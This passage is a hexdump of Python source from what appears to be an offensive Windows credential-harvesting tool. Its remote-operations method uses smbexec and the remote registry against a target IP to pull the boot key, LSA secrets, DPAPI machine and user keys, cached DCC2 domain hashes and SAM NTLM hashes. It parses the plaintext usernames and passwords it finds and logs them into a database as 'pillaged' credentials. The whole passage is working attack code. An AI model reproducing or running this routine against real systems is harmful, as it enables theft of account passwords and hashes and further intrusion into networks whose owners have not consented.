+00018800: 6563 7279 7074 6564 273a 2020 2320 5368  ecrypted':  # Sh
+00018810: 6f75 6c64 276e 7420 676f 2068 6572 650a  ould'nt go here.
+00018820: 0909 0909 7265 7475 726e 2075 7365 722e  ....return user.
+00018830: 6d61 7374 6572 6b65 7973 5f66 696c 655b  masterkeys_file[
+00018840: 6775 6964 5d0a 0a09 6465 6620 7465 7374  guid]...def test
+00018850: 5f72 656d 6f74 654f 7073 2873 656c 6629  _remoteOps(self)
+00018860: 3a0a 0909 7472 793a 0a09 0909 2320 5265  :...try:....# Re
+00018870: 6d6f 7665 206c 6f67 6769 6e67 0a09 0909  move logging....
+00018880: 2320 6c6f 6767 696e 672e 6765 744c 6f67  # logging.getLog
+00018890: 6765 7228 292e 7365 744c 6576 656c 286c  ger().setLevel(l
+000188a0: 6f67 6769 6e67 2e43 5249 5449 4341 4c29  ogging.CRITICAL)
+000188b0: 0a09 0909 7365 6c66 2e6c 6f67 6769 6e67  ....self.logging
+000188c0: 2e69 6e66 6f28 6622 5b7b 7365 6c66 2e6f  .info(f"[{self.o
+000188d0: 7074 696f 6e73 2e74 6172 6765 745f 6970  ptions.target_ip
+000188e0: 7d5d 207b 6263 6f6c 6f72 732e 4f4b 424c  }] {bcolors.OKBL
+000188f0: 5545 7d20 5b2b 5d20 4475 6d70 696e 6720  UE} [+] Dumping 
+00018900: 4c53 4120 5365 6372 6574 737b 6263 6f6c  LSA Secrets{bcol
+00018910: 6f72 732e 454e 4443 7d22 290a 0a09 0909  ors.ENDC}").....
+00018920: 7365 6c66 2e5f 5f72 656d 6f74 654f 7073  self.__remoteOps
+00018930: 203d 204d 7952 656d 6f74 654f 7065 7261   = MyRemoteOpera
+00018940: 7469 6f6e 7328 7365 6c66 2e73 6d62 2c20  tions(self.smb, 
+00018950: 7365 6c66 2e6f 7074 696f 6e73 2e6b 2c20  self.options.k, 
+00018960: 7365 6c66 2e6f 7074 696f 6e73 2e64 635f  self.options.dc_
+00018970: 6970 290a 0909 0973 656c 662e 5f5f 7265  ip)....self.__re
+00018980: 6d6f 7465 4f70 732e 7365 7445 7865 634d  moteOps.setExecM
+00018990: 6574 686f 6428 2773 6d62 6578 6563 2729  ethod('smbexec')
+000189a0: 0a09 0909 7365 6c66 2e5f 5f72 656d 6f74  ....self.__remot
+000189b0: 654f 7073 2e65 6e61 626c 6552 6567 6973  eOps.enableRegis
+000189c0: 7472 7928 290a 0909 0973 656c 662e 5f5f  try()....self.__
+000189d0: 626f 6f74 4b65 7920 3d20 7365 6c66 2e5f  bootKey = self._
+000189e0: 5f72 656d 6f74 654f 7073 2e67 6574 426f  _remoteOps.getBo
+000189f0: 6f74 4b65 7928 290a 0909 0973 656c 662e  otKey()....self.
+00018a00: 6c6f 6767 696e 672e 6465 6275 6728 6622  logging.debug(f"
+00018a10: 626f 6f74 6b65 793a 207b 7365 6c66 2e5f  bootkey: {self._
+00018a20: 5f62 6f6f 744b 6579 7d22 290a 0909 0953  _bootKey}")....S
+00018a30: 4543 5552 4954 5946 696c 654e 616d 6520  ECURITYFileName 
+00018a40: 3d20 7365 6c66 2e5f 5f72 656d 6f74 654f  = self.__remoteO
+00018a50: 7073 2e73 6176 6553 4543 5552 4954 5928  ps.saveSECURITY(
+00018a60: 290a 0909 0973 656c 662e 6c6f 6767 696e  )....self.loggin
+00018a70: 672e 6465 6275 6728 2273 6176 6573 6563  g.debug("savesec
+00018a80: 7572 6974 7922 290a 0909 0973 656c 662e  urity")....self.
+00018a90: 5f5f 4c53 4153 6563 7265 7473 203d 204d  __LSASecrets = M
+00018aa0: 794c 5341 5365 6372 6574 7328 5345 4355  yLSASecrets(SECU
+00018ab0: 5249 5459 4669 6c65 4e61 6d65 2c20 7365  RITYFileName, se
+00018ac0: 6c66 2e5f 5f62 6f6f 744b 6579 2c20 7365  lf.__bootKey, se
+00018ad0: 6c66 2e5f 5f72 656d 6f74 654f 7073 2c20  lf.__remoteOps, 
+00018ae0: 6973 5265 6d6f 7465 3d54 7275 652c 0a09  isRemote=True,..
+00018af0: 0909 0909 0909 0909 0909 2068 6973 746f  .......... histo
+00018b00: 7279 3d54 7275 6529 0a09 0909 7365 6c66  ry=True)....self
+00018b10: 2e6c 6f67 6769 6e67 2e64 6562 7567 2822  .logging.debug("
+00018b20: 4c53 4153 6563 7265 7422 290a 0909 0973  LSASecret")....s
+00018b30: 656c 662e 5f5f 4c53 4153 6563 7265 7473  elf.__LSASecrets
+00018b40: 2e64 756d 7043 6163 6865 6448 6173 6865  .dumpCachedHashe
+00018b50: 7328 290a 0909 0973 656c 662e 6c6f 6767  s()....self.logg
+00018b60: 696e 672e 6465 6275 6728 2264 756d 7020  ing.debug("dump 
+00018b70: 6361 6368 6564 2068 6173 6865 7322 290a  cached hashes").
+00018b80: 0909 0973 656c 662e 5f5f 4c53 4153 6563  ...self.__LSASec
+00018b90: 7265 7473 2e64 756d 7053 6563 7265 7473  rets.dumpSecrets
+00018ba0: 2829 0a0a 0909 0966 696c 6564 6573 7420  ().....filedest 
+00018bb0: 3d20 6f73 2e70 6174 682e 6a6f 696e 286f  = os.path.join(o
+00018bc0: 732e 7061 7468 2e6a 6f69 6e28 7365 6c66  s.path.join(self
+00018bd0: 2e6f 7074 696f 6e73 2e6f 7574 7075 745f  .options.output_
+00018be0: 6469 7265 6374 6f72 792c 2073 656c 662e  directory, self.
+00018bf0: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
+00018c00: 7029 2c20 274c 5341 2729 0a09 0909 5061  p), 'LSA')....Pa
+00018c10: 7468 286f 732e 7061 7468 2e73 706c 6974  th(os.path.split
+00018c20: 2866 696c 6564 6573 742e 7265 706c 6163  (filedest.replac
+00018c30: 6528 275c 5c27 2c20 272f 2729 295b 305d  e('\\', '/'))[0]
+00018c40: 292e 6d6b 6469 7228 7061 7265 6e74 733d  ).mkdir(parents=
+00018c50: 5472 7565 2c20 6578 6973 745f 6f6b 3d54  True, exist_ok=T
+00018c60: 7275 6529 0a09 0909 7365 6c66 2e6c 6f67  rue)....self.log
+00018c70: 6769 6e67 2e64 6562 7567 2866 225b 7b73  ging.debug(f"[{s
+00018c80: 656c 662e 6f70 7469 6f6e 732e 7461 7267  elf.options.targ
+00018c90: 6574 5f69 707d 5d20 4475 6d70 696e 6720  et_ip}] Dumping 
+00018ca0: 4c53 4120 5365 6372 6574 7320 746f 2066  LSA Secrets to f
+00018cb0: 696c 6520 7b66 696c 6564 6573 747d 2229  ile {filedest}")
+00018cc0: 0a09 0909 6669 6e61 6c66 696c 6520 3d20  ....finalfile = 
+00018cd0: 7365 6c66 2e5f 5f4c 5341 5365 6372 6574  self.__LSASecret
+00018ce0: 732e 6578 706f 7274 5365 6372 6574 7328  s.exportSecrets(
+00018cf0: 6669 6c65 6465 7374 290a 0909 0973 656c  filedest)....sel
+00018d00: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
+00018d10: 2272 6574 2066 696c 6520 2573 2220 2520  "ret file %s" % 
+00018d20: 6669 6e61 6c66 696c 6529 0a09 0909 7365  finalfile)....se
+00018d30: 6c66 2e5f 5f4c 5341 5365 6372 6574 732e  lf.__LSASecrets.
+00018d40: 6578 706f 7274 4361 6368 6564 2866 696c  exportCached(fil
+00018d50: 6564 6573 7429 0a09 0923 2041 6e61 6c79  edest)...# Analy
+00018d60: 7365 7220 6c65 7320 6861 7368 2044 4343  ser les hash DCC
+00018d70: 3220 706f 7572 2075 6e20 6578 706f 7274  2 pour un export
+00018d80: 206d 6173 7369 662e 0a09 0965 7863 6570   massif....excep
+00018d90: 7420 4578 6365 7074 696f 6e20 6173 2065  t Exception as e
+00018da0: 783a 0a09 0909 7365 6c66 2e6c 6f67 6769  x:....self.loggi
+00018db0: 6e67 2e64 6562 7567 280a 0909 0909 6622  ng.debug(.....f"
+00018dc0: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
+00018dd0: 6172 6765 745f 6970 7d5d 2045 7863 6570  arget_ip}] Excep
+00018de0: 7420 7265 6d6f 7465 4f70 7320 4c53 4122  t remoteOps LSA"
+00018df0: 290a 0909 0973 656c 662e 6c6f 6767 696e  )....self.loggin
+00018e00: 672e 6465 6275 6728 6578 290a 0909 7472  g.debug(ex)...tr
+00018e10: 793a 0a09 0909 746d 705f 6669 6c65 6465  y:....tmp_filede
+00018e20: 7374 203d 2066 696c 6564 6573 7420 2b20  st = filedest + 
+00018e30: 272e 7365 6372 6574 7327 0a09 0909 6620  '.secrets'....f 
+00018e40: 3d20 6f70 656e 2874 6d70 5f66 696c 6564  = open(tmp_filed
+00018e50: 6573 742c 2027 7262 2729 0a09 0909 7365  est, 'rb')....se
+00018e60: 6372 6574 7320 3d20 662e 7265 6164 2829  crets = f.read()
+00018e70: 2e73 706c 6974 2862 275c 6e27 290a 0909  .split(b'\n')...
+00018e80: 0966 2e63 6c6f 7365 2829 0a09 0909 666f  .f.close()....fo
+00018e90: 7220 696e 6465 782c 2073 6563 7265 7420  r index, secret 
+00018ea0: 696e 2065 6e75 6d65 7261 7465 2873 6563  in enumerate(sec
+00018eb0: 7265 7473 293a 0a09 0909 0969 6620 6227  rets):.....if b'
+00018ec0: 6470 6170 695f 6d61 6368 696e 656b 6579  dpapi_machinekey
+00018ed0: 2720 696e 2073 6563 7265 743a 0a09 0909  ' in secret:....
+00018ee0: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e69  ..self.logging.i
+00018ef0: 6e66 6f28 0a09 0909 0909 0966 225b 7b73  nfo(.......f"[{s
+00018f00: 656c 662e 6f70 7469 6f6e 732e 7461 7267  elf.options.targ
+00018f10: 6574 5f69 707d 5d20 7b62 636f 6c6f 7273  et_ip}] {bcolors
+00018f20: 2e4f 4b42 4c55 457d 5b2d 5d20 466f 756e  .OKBLUE}[-] Foun
+00018f30: 6420 4450 4150 4920 4d61 6368 696e 6520  d DPAPI Machine 
+00018f40: 6b65 797b 6263 6f6c 6f72 732e 454e 4443  key{bcolors.ENDC
+00018f50: 7d20 3a20 7b73 6563 7265 742e 7370 6c69  } : {secret.spli
+00018f60: 7428 6227 6470 6170 695f 6d61 6368 696e  t(b'dpapi_machin
+00018f70: 656b 6579 3a27 295b 315d 2e64 6563 6f64  ekey:')[1].decod
+00018f80: 6528 2775 7466 2d38 2729 7d22 290a 0909  e('utf-8')}")...
+00018f90: 0909 0923 2070 7269 6e74 2873 6563 7265  ...# print(secre
+00018fa0: 742e 7370 6c69 7428 6227 6470 6170 695f  t.split(b'dpapi_
+00018fb0: 6d61 6368 696e 656b 6579 3a27 295b 315d  machinekey:')[1]
+00018fc0: 290a 0909 0909 0973 656c 662e 6d61 6368  )......self.mach
+00018fd0: 696e 655f 6b65 792e 6170 7065 6e64 2873  ine_key.append(s
+00018fe0: 6563 7265 742e 7370 6c69 7428 6227 6470  ecret.split(b'dp
+00018ff0: 6170 695f 6d61 6368 696e 656b 6579 3a27  api_machinekey:'
+00019000: 295b 315d 290a 0909 0909 0973 656c 662e  )[1])......self.
+00019010: 6c6f 6767 696e 672e 6465 6275 6728 7365  logging.debug(se
+00019020: 6c66 2e6d 6163 6869 6e65 5f6b 6579 290a  lf.machine_key).
+00019030: 0909 0909 6966 2062 2764 7061 7069 5f75  ....if b'dpapi_u
+00019040: 7365 726b 6579 2720 696e 2073 6563 7265  serkey' in secre
+00019050: 743a 0a09 0909 0909 7365 6c66 2e6c 6f67  t:......self.log
+00019060: 6769 6e67 2e69 6e66 6f28 0a09 0909 0909  ging.info(......
+00019070: 0966 225b 7b73 656c 662e 6f70 7469 6f6e  .f"[{self.option
+00019080: 732e 7461 7267 6574 5f69 707d 5d20 7b62  s.target_ip}] {b
+00019090: 636f 6c6f 7273 2e4f 4b42 4c55 457d 5b2d  colors.OKBLUE}[-
+000190a0: 5d20 466f 756e 6420 4450 4150 4920 5573  ] Found DPAPI Us
+000190b0: 6572 206b 6579 7b62 636f 6c6f 7273 2e45  er key{bcolors.E
+000190c0: 4e44 437d 203a 207b 7365 6372 6574 2e73  NDC} : {secret.s
+000190d0: 706c 6974 2862 2764 7061 7069 5f75 7365  plit(b'dpapi_use
+000190e0: 726b 6579 3a27 295b 315d 2e64 6563 6f64  rkey:')[1].decod
+000190f0: 6528 2775 7466 2d38 2729 7d22 290a 0909  e('utf-8')}")...
+00019100: 0909 0973 656c 662e 7573 6572 5f6b 6579  ...self.user_key
+00019110: 2e61 7070 656e 6428 7365 6372 6574 2e73  .append(secret.s
+00019120: 706c 6974 2862 2764 7061 7069 5f75 7365  plit(b'dpapi_use
+00019130: 726b 6579 3a27 295b 315d 290a 0909 0909  rkey:')[1]).....
+00019140: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
+00019150: 6275 6728 7365 6c66 2e75 7365 725f 6b65  bug(self.user_ke
+00019160: 7929 0a09 0909 0969 6620 6227 3a27 2069  y).....if b':' i
+00019170: 6e20 7365 6372 6574 3a0a 0909 0909 0969  n secret:......i
+00019180: 6620 7365 6372 6574 2e63 6f75 6e74 2862  f secret.count(b
+00019190: 273a 2729 203d 3d20 313a 0a09 0909 0909  ':') == 1:......
+000191a0: 0975 7365 726e 616d 652c 2070 6173 7377  .username, passw
+000191b0: 6f72 6420 3d20 7365 6372 6574 2e73 706c  ord = secret.spl
+000191c0: 6974 2862 273a 2729 0a09 0909 0909 0969  it(b':').......i
+000191d0: 6620 7573 6572 6e61 6d65 2e64 6563 6f64  f username.decod
+000191e0: 6528 2775 7466 2d38 2729 206e 6f74 2069  e('utf-8') not i
+000191f0: 6e20 5b27 6470 6170 695f 6d61 6368 696e  n ['dpapi_machin
+00019200: 656b 6579 272c 2027 6470 6170 695f 7573  ekey', 'dpapi_us
+00019210: 6572 6b65 7927 2c20 274e 4c24 4b4d 275d  erkey', 'NL$KM']
+00019220: 3a0a 0909 0909 0909 0969 6620 7573 6572  :........if user
+00019230: 6e61 6d65 2e64 6563 6f64 6528 2775 7466  name.decode('utf
+00019240: 2d38 2729 206e 6f74 2069 6e20 7365 6c66  -8') not in self
+00019250: 2e6f 7074 696f 6e73 2e63 7265 647a 3a0a  .options.credz:.
+00019260: 0a09 0909 0909 0909 0973 656c 662e 6f70  .........self.op
+00019270: 7469 6f6e 732e 6372 6564 7a5b 7573 6572  tions.credz[user
+00019280: 6e61 6d65 2e64 6563 6f64 6528 2775 7466  name.decode('utf
+00019290: 2d38 2729 5d20 3d20 5b70 6173 7377 6f72  -8')] = [passwor
+000192a0: 642e 6465 636f 6465 2827 7574 662d 3827  d.decode('utf-8'
+000192b0: 295d 0a09 0909 0909 0909 0973 656c 662e  )].........self.
+000192c0: 6c6f 6767 696e 672e 696e 666f 280a 0909  logging.info(...
+000192d0: 0909 0909 0909 0966 225b 7b73 656c 662e  .......f"[{self.
+000192e0: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
+000192f0: 707d 5d20 5b2b 5d20 7b62 636f 6c6f 7273  p}] [+] {bcolors
+00019300: 2e4f 4b42 4c55 457d 204c 5341 203a 207b  .OKBLUE} LSA : {
+00019310: 6263 6f6c 6f72 732e 4f4b 4752 4545 4e7d  bcolors.OKGREEN}
+00019320: 207b 7573 6572 6e61 6d65 2e64 6563 6f64   {username.decod
+00019330: 6528 2775 7466 2d38 2729 7d20 3a20 7b70  e('utf-8')} : {p
+00019340: 6173 7377 6f72 642e 6465 636f 6465 2827  assword.decode('
+00019350: 7574 662d 3827 297d 207b 6263 6f6c 6f72  utf-8')} {bcolor
+00019360: 732e 454e 4443 7d22 290a 0a09 0909 0909  s.ENDC}").......
+00019370: 0909 656c 7365 3a0a 0909 0909 0909 0909  ..else:.........
+00019380: 6966 2070 6173 7377 6f72 642e 6465 636f  if password.deco
+00019390: 6465 2827 7574 662d 3827 2920 6e6f 7420  de('utf-8') not 
+000193a0: 696e 2073 656c 662e 6f70 7469 6f6e 732e  in self.options.
+000193b0: 6372 6564 7a5b 7573 6572 6e61 6d65 2e64  credz[username.d
+000193c0: 6563 6f64 6528 2775 7466 2d38 2729 5d3a  ecode('utf-8')]:
+000193d0: 0a09 0909 0909 0909 0909 7365 6c66 2e6f  ..........self.o
+000193e0: 7074 696f 6e73 2e63 7265 647a 5b75 7365  ptions.credz[use
+000193f0: 726e 616d 652e 6465 636f 6465 2827 7574  rname.decode('ut
+00019400: 662d 3827 295d 2e61 7070 656e 6428 7061  f-8')].append(pa
+00019410: 7373 776f 7264 2e64 6563 6f64 6528 2775  ssword.decode('u
+00019420: 7466 2d38 2729 290a 0909 0909 0909 0909  tf-8')).........
+00019430: 0973 656c 662e 6c6f 6767 696e 672e 696e  .self.logging.in
+00019440: 666f 280a 0909 0909 0909 0909 0909 6622  fo(...........f"
+00019450: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
+00019460: 6172 6765 745f 6970 7d5d 205b 2b5d 207b  arget_ip}] [+] {
+00019470: 6263 6f6c 6f72 732e 4f4b 424c 5545 7d20  bcolors.OKBLUE} 
+00019480: 4c53 4120 3a20 7b62 636f 6c6f 7273 2e4f  LSA : {bcolors.O
+00019490: 4b47 5245 454e 7d20 7b75 7365 726e 616d  KGREEN} {usernam
+000194a0: 652e 6465 636f 6465 2827 7574 662d 3827  e.decode('utf-8'
+000194b0: 297d 203a 207b 7061 7373 776f 7264 2e64  )} : {password.d
+000194c0: 6563 6f64 6528 2775 7466 2d38 2729 7d20  ecode('utf-8')} 
+000194d0: 7b62 636f 6c6f 7273 2e45 4e44 437d 2229  {bcolors.ENDC}")
+000194e0: 0a09 0909 0909 0909 2323 2323 2323 2323  ........########
+000194f0: 2323 2323 5052 4f43 4553 5349 4e47 2044  ####PROCESSING D
+00019500: 4154 410a 0909 0909 0909 0973 656c 662e  ATA........self.
+00019510: 6462 2e61 6464 5f63 7265 647a 2863 7265  db.add_credz(cre
+00019520: 647a 5f74 7970 653d 274c 5341 272c 0a09  dz_type='LSA',..
+00019530: 0909 0909 0909 0909 0909 2020 6372 6564  ..........  cred
+00019540: 7a5f 7573 6572 6e61 6d65 3d75 7365 726e  z_username=usern
+00019550: 616d 652e 6465 636f 6465 2827 7574 662d  ame.decode('utf-
+00019560: 3827 292c 0a09 0909 0909 0909 0909 0909  8'),............
+00019570: 2020 6372 6564 7a5f 7061 7373 776f 7264    credz_password
+00019580: 3d70 6173 7377 6f72 642e 6465 636f 6465  =password.decode
+00019590: 2827 7574 662d 3827 292c 0a09 0909 0909  ('utf-8'),......
+000195a0: 0909 0909 0909 2020 6372 6564 7a5f 7461  ......  credz_ta
+000195b0: 7267 6574 3d27 272c 0a09 0909 0909 0909  rget='',........
+000195c0: 0909 0909 2020 6372 6564 7a5f 7061 7468  ....  credz_path
+000195d0: 3d74 6d70 5f66 696c 6564 6573 742c 0a09  =tmp_filedest,..
+000195e0: 0909 0909 0909 0909 0909 2020 7069 6c6c  ..........  pill
+000195f0: 6167 6564 5f66 726f 6d5f 636f 6d70 7574  aged_from_comput
+00019600: 6572 5f69 703d 7365 6c66 2e6f 7074 696f  er_ip=self.optio
+00019610: 6e73 2e74 6172 6765 745f 6970 2c0a 0909  ns.target_ip,...
+00019620: 0909 0909 0909 0909 0920 2070 696c 6c61  .........  pilla
+00019630: 6765 645f 6672 6f6d 5f75 7365 726e 616d  ged_from_usernam
+00019640: 653d 274d 4143 4849 4e45 2427 290a 0a09  e='MACHINE$')...
+00019650: 0909 0965 6c73 653a 0a09 0909 0909 7365  ...else:......se
+00019660: 6c66 2e6c 6f67 6769 6e67 2e64 6562 7567  lf.logging.debug
+00019670: 2822 5365 6372 6574 2025 6920 2d20 2573  ("Secret %i - %s
+00019680: 2220 2520 2869 6e64 6578 2c20 7365 6372  " % (index, secr
+00019690: 6574 2929 0a09 0965 7863 6570 7420 4578  et))...except Ex
+000196a0: 6365 7074 696f 6e20 6173 2065 783a 0a09  ception as ex:..
+000196b0: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
+000196c0: 6562 7567 280a 0909 0909 6622 5b7b 7365  ebug(.....f"[{se
+000196d0: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
+000196e0: 745f 6970 7d5d 2045 7863 6570 7420 7265  t_ip}] Except re
+000196f0: 6d6f 7465 4f70 7320 5365 6372 6574 7322  moteOps Secrets"
+00019700: 290a 0909 0973 656c 662e 6c6f 6767 696e  )....self.loggin
+00019710: 672e 6465 6275 6728 6578 290a 0a09 0974  g.debug(ex)....t
+00019720: 7279 3a0a 0909 0923 2341 6464 2044 4343  ry:....##Add DCC
+00019730: 320a 0a09 0909 746d 705f 6669 6c65 6465  2.....tmp_filede
+00019740: 7374 203d 2066 696c 6564 6573 7420 2b20  st = filedest + 
+00019750: 272e 6361 6368 6564 270a 0909 0966 203d  '.cached'....f =
+00019760: 206f 7065 6e28 746d 705f 6669 6c65 6465   open(tmp_filede
+00019770: 7374 2c20 2772 6227 290a 0909 0973 6563  st, 'rb')....sec
+00019780: 7265 7473 203d 2066 2e72 6561 6428 292e  rets = f.read().
+00019790: 7370 6c69 7428 6227 5c6e 2729 0a09 0909  split(b'\n')....
+000197a0: 662e 636c 6f73 6528 290a 0909 0966 6f72  f.close()....for
+000197b0: 2069 6e64 6578 2c20 7365 6372 6574 2069   index, secret i
+000197c0: 6e20 656e 756d 6572 6174 6528 7365 6372  n enumerate(secr
+000197d0: 6574 7329 3a0a 0909 0909 6966 2062 273a  ets):.....if b':
+000197e0: 2720 696e 2073 6563 7265 7420 616e 6420  ' in secret and 
+000197f0: 6227 2327 2069 6e20 7365 6372 6574 3a0a  b'#' in secret:.
+00019800: 0909 0909 0969 6620 7365 6372 6574 2e63  .....if secret.c
+00019810: 6f75 6e74 2862 273a 2729 203d 3d20 313a  ount(b':') == 1:
+00019820: 0a09 0909 0909 0975 7365 726e 616d 652c  .......username,
+00019830: 2070 6173 7377 6f72 6420 3d20 7365 6372   password = secr
+00019840: 6574 2e73 706c 6974 2862 273a 2729 0a09  et.split(b':')..
+00019850: 0909 0909 0973 656c 662e 6c6f 6767 696e  .....self.loggin
+00019860: 672e 6465 6275 6728 0a09 0909 0909 0909  g.debug(........
+00019870: 6622 5b7b 7365 6c66 2e6f 7074 696f 6e73  f"[{self.options
+00019880: 2e74 6172 6765 745f 6970 7d5d 207b 6263  .target_ip}] {bc
+00019890: 6f6c 6f72 732e 4f4b 424c 5545 7d5b 2d5d  olors.OKBLUE}[-]
+000198a0: 2046 6f75 6e64 2044 4343 3220 6861 7368   Found DCC2 hash
+000198b0: 203a 7b62 636f 6c6f 7273 2e4f 4b47 5245   :{bcolors.OKGRE
+000198c0: 454e 7d20 7b73 6563 7265 742e 6465 636f  EN} {secret.deco
+000198d0: 6465 2827 7574 662d 3827 297d 7b62 636f  de('utf-8')}{bco
+000198e0: 6c6f 7273 2e45 4e44 437d 2229 0a09 0909  lors.ENDC}")....
+000198f0: 0909 0923 2323 2323 2323 2323 2323 2350  ...############P
+00019900: 524f 4345 5353 494e 4720 4441 5441 0a09  ROCESSING DATA..
+00019910: 0909 0909 0973 656c 662e 6462 2e61 6464  .....self.db.add
+00019920: 5f63 7265 647a 2863 7265 647a 5f74 7970  _credz(credz_typ
+00019930: 653d 2744 4343 3227 2c0a 0909 0909 0909  e='DCC2',.......
+00019940: 0909 0909 2020 6372 6564 7a5f 7573 6572  ....  credz_user
+00019950: 6e61 6d65 3d75 7365 726e 616d 652e 6465  name=username.de
+00019960: 636f 6465 2827 7574 662d 3827 292c 0a09  code('utf-8'),..
+00019970: 0909 0909 0909 0909 0920 2063 7265 647a  .........  credz
+00019980: 5f70 6173 7377 6f72 643d 7061 7373 776f  _password=passwo
+00019990: 7264 2e64 6563 6f64 6528 2775 7466 2d38  rd.decode('utf-8
+000199a0: 2729 2c0a 0909 0909 0909 0909 0909 2020  '),...........  
+000199b0: 6372 6564 7a5f 7461 7267 6574 3d27 272c  credz_target='',
+000199c0: 0a09 0909 0909 0909 0909 0920 2063 7265  ...........  cre
+000199d0: 647a 5f70 6174 683d 746d 705f 6669 6c65  dz_path=tmp_file
+000199e0: 6465 7374 2c0a 0909 0909 0909 0909 0909  dest,...........
+000199f0: 2020 7069 6c6c 6167 6564 5f66 726f 6d5f    pillaged_from_
+00019a00: 636f 6d70 7574 6572 5f69 703d 7365 6c66  computer_ip=self
+00019a10: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
+00019a20: 6970 2c0a 0909 0909 0909 0909 0909 2020  ip,...........  
+00019a30: 7069 6c6c 6167 6564 5f66 726f 6d5f 7573  pillaged_from_us
+00019a40: 6572 6e61 6d65 3d27 4d41 4348 494e 4524  ername='MACHINE$
+00019a50: 2729 0a0a 0909 0909 656c 7365 3a0a 0909  ')......else:...
+00019a60: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
+00019a70: 6465 6275 6728 2253 6563 7265 7420 2569  debug("Secret %i
+00019a80: 202d 2025 7322 2025 2028 696e 6465 782c   - %s" % (index,
+00019a90: 2073 6563 7265 7429 290a 0909 6578 6365   secret))...exce
+00019aa0: 7074 2045 7863 6570 7469 6f6e 2061 7320  pt Exception as 
+00019ab0: 6578 3a0a 0909 0973 656c 662e 6c6f 6767  ex:....self.logg
+00019ac0: 696e 672e 6465 6275 6728 0a09 0909 0966  ing.debug(.....f
+00019ad0: 225b 7b73 656c 662e 6f70 7469 6f6e 732e  "[{self.options.
+00019ae0: 7461 7267 6574 5f69 707d 5d20 4578 6365  target_ip}] Exce
+00019af0: 7074 2072 656d 6f74 654f 7073 204c 5341  pt remoteOps LSA
+00019b00: 2044 4343 3222 290a 0909 0973 656c 662e   DCC2")....self.
+00019b10: 6c6f 6767 696e 672e 6465 6275 6728 6578  logging.debug(ex
+00019b20: 290a 0a09 0974 7279 3a0a 0909 0923 2041  )....try:....# A
+00019b30: 6464 2053 414d 0a09 0909 7365 6c66 2e6c  dd SAM....self.l
+00019b40: 6f67 6769 6e67 2e69 6e66 6f28 6622 5b7b  ogging.info(f"[{
+00019b50: 7365 6c66 2e6f 7074 696f 6e73 2e74 6172  self.options.tar
+00019b60: 6765 745f 6970 7d5d 207b 6263 6f6c 6f72  get_ip}] {bcolor
+00019b70: 732e 4f4b 424c 5545 7d20 5b2b 5d20 4475  s.OKBLUE} [+] Du
+00019b80: 6d70 696e 6720 5341 4d20 5365 6372 6574  mping SAM Secret
+00019b90: 737b 6263 6f6c 6f72 732e 454e 4443 7d22  s{bcolors.ENDC}"
+00019ba0: 290a 0909 0953 414d 4669 6c65 4e61 6d65  )....SAMFileName
+00019bb0: 203d 2073 656c 662e 5f5f 7265 6d6f 7465   = self.__remote
+00019bc0: 4f70 732e 7361 7665 5341 4d28 290a 0909  Ops.saveSAM()...
+00019bd0: 0973 656c 662e 5f5f 5341 4d48 6173 6865  .self.__SAMHashe
+00019be0: 7320 3d20 4d79 5341 4d48 6173 6865 7328  s = MySAMHashes(
+00019bf0: 5341 4d46 696c 654e 616d 652c 2073 656c  SAMFileName, sel
+00019c00: 662e 5f5f 626f 6f74 4b65 792c 2069 7352  f.__bootKey, isR
+00019c10: 656d 6f74 653d 5472 7565 290a 0909 0973  emote=True)....s
+00019c20: 656c 662e 5f5f 5341 4d48 6173 6865 732e  elf.__SAMHashes.
+00019c30: 6475 6d70 2829 0a09 0909 6669 6c65 6465  dump()....filede
+00019c40: 7374 203d 206f 732e 7061 7468 2e6a 6f69  st = os.path.joi
+00019c50: 6e28 6f73 2e70 6174 682e 6a6f 696e 2873  n(os.path.join(s
+00019c60: 656c 662e 6f70 7469 6f6e 732e 6f75 7470  elf.options.outp
+00019c70: 7574 5f64 6972 6563 746f 7279 2c20 7365  ut_directory, se
+00019c80: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
+00019c90: 745f 6970 292c 2027 5341 4d27 290a 0909  t_ip), 'SAM')...
+00019ca0: 0973 656c 662e 5f5f 5341 4d48 6173 6865  .self.__SAMHashe
+00019cb0: 732e 6578 706f 7274 2866 696c 6564 6573  s.export(filedes
+00019cc0: 7429 0a09 0909 2320 4164 6469 6e67 2053  t)....# Adding S
+00019cd0: 414d 2068 6173 6820 746f 2063 7265 647a  AM hash to credz
+00019ce0: 0a09 0909 746d 705f 6669 6c65 6465 7374  ....tmp_filedest
+00019cf0: 203d 2066 696c 6564 6573 7420 2b20 272e   = filedest + '.
+00019d00: 7361 6d27 0a09 0909 6620 3d20 6f70 656e  sam'....f = open
+00019d10: 2874 6d70 5f66 696c 6564 6573 742c 2027  (tmp_filedest, '
+00019d20: 7262 2729 0a09 0909 7361 6d5f 6461 7461  rb')....sam_data
+00019d30: 203d 2066 2e72 6561 6428 292e 7370 6c69   = f.read().spli
+00019d40: 7428 6227 5c6e 2729 0a09 0909 662e 636c  t(b'\n')....f.cl
+00019d50: 6f73 6528 290a 0909 0966 6f72 2073 616d  ose()....for sam
+00019d60: 5f6c 696e 6520 696e 2073 616d 5f64 6174  _line in sam_dat
+00019d70: 613a 0a09 0909 0969 6620 6227 3a27 2069  a:.....if b':' i
+00019d80: 6e20 7361 6d5f 6c69 6e65 3a0a 0909 0909  n sam_line:.....
+00019d90: 0969 6620 7361 6d5f 6c69 6e65 2e63 6f75  .if sam_line.cou
+00019da0: 6e74 2862 273a 2729 203d 3d20 363a 0a09  nt(b':') == 6:..
+00019db0: 0909 0909 0975 7365 726e 616d 652c 2073  .....username, s
+00019dc0: 6964 2c20 6c6d 2c20 6e74 6c6d 2c20 5f2c  id, lm, ntlm, _,
+00019dd0: 205f 2c20 5f20 3d20 7361 6d5f 6c69 6e65   _, _ = sam_line
+00019de0: 2e73 706c 6974 2862 273a 2729 0a09 0909  .split(b':')....
